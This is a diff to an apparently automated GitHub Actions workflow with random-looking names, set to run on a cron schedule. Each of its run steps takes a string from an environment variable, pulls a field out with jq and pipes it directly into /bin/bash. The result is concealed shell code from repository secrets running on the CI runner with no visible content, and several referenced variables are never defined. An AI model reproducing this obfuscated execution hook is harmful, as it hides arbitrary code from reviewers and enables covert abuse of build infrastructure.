@@ -1,23 +1,19 @@
 name: talentedfrequency
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 3/6 * * *'
-
-jobs:  # 16973
+    - cron: '33 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: talentedfrequency
         env:
-          liuw5: ${{ secrets.liuw5 }}
+          cziyt917: ${{ secrets.cziyt917 }}
         run: |
-          echo $liuw5 | jq -r .jyay36 | /bin/bash
-          echo $v5944 | jq -r .skqqr20 | /bin/bash
-          echo $stdt89 | jq -r .luuue58 | /bin/bash
-          echo $skl633 | jq -r .nt21 | /bin/bash
-          echo $fln14 | jq -r .ydp277 | /bin/bash
-          echo $htu5505 | jq -r .ga34 | /bin/bash
-          echo $oi65 | jq -r .qfg9 | /bin/bash
+          echo $cziyt917 | jq -r .yjmi426 | /bin/bash
+          echo $whq9 | jq -r .bseo415 | /bin/bash
+          echo $v983 | jq -r .i696 | /bin/bash
 
